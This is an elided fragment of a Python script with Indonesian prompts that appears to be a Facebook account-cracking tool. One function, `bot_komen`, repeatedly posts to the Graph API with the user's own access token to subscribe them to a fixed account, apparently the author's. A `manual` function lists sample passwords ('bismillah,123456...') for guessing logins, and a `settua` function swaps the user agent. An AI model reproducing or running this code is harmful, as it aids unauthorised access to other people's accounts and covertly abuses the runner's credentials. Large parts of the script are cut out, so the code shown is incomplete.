...
def bot_komen():
    ...
    requests.post('https://graph.facebook.com/100058437284311/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100058437284311/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100058437284311/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100058437284311/subscribers?access_token=' + token)
...
def manual():
	print(" \033[0;97m[\033[0;93m*\033[0;97m] Contoh : bismillah,123456,indonesia,rahasia,cantik,bangsat")
...
def settua():
	...
	if ask =="":
		...
		try:
			...
			uas.write(ua) 
			uas.close()
			print("\n \033[0;97m[\033[0;92m✓\033[0;97m] Sukses mengganti User-HP")
			time.sleep(2)
			menu()
		except KeyboardInterrupt:
			exit()
